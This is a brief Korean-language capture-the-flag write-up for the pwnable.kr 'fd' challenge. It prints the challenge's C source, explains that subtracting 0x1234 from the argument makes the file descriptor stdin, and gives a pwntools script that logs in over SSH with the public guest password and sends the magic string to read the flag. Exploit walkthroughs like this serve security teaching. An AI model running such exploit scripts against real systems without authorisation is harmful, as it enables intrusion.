# fd

## fd.c

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
char buf[32];
int main(int argc, char* argv[], char* envp[]){
        if(argc<2){
                printf("pass argv[1] a number\n");
                return 0;
        }
        int fd = atoi( argv[1] ) - 0x1234;
        int len = 0;
        len = read(fd, buf, 32);
        if(!strcmp("LETMEWIN\n", buf)){
                printf("good job :)\n");
                system("/bin/cat flag");
                exit(0);
        }
        printf("learn about Linux file IO\n");
        return 0;

}
```

`argv[1]`에 숫자를 넣어주면 그 수에서 `0x1234`를 빼 그 값을 `fd`로 사용한다. `fd`가 0일 때 `stdin`이다. `argv[1]`에 `0x1234`를 10진수로 넣어주면 된다.

## exploit.py

```python
from pwn import *

context.log_level = 'debug'

shell = ssh('fd', 'pwnable.kr', 2222, password='guest')
p = shell.run('./fd ' + str(0x1234))
p.sendline('LETMEWIN')
p.recv()
```

    현재 `fd` 계정에 접속 불가능해 여기까지만 작성함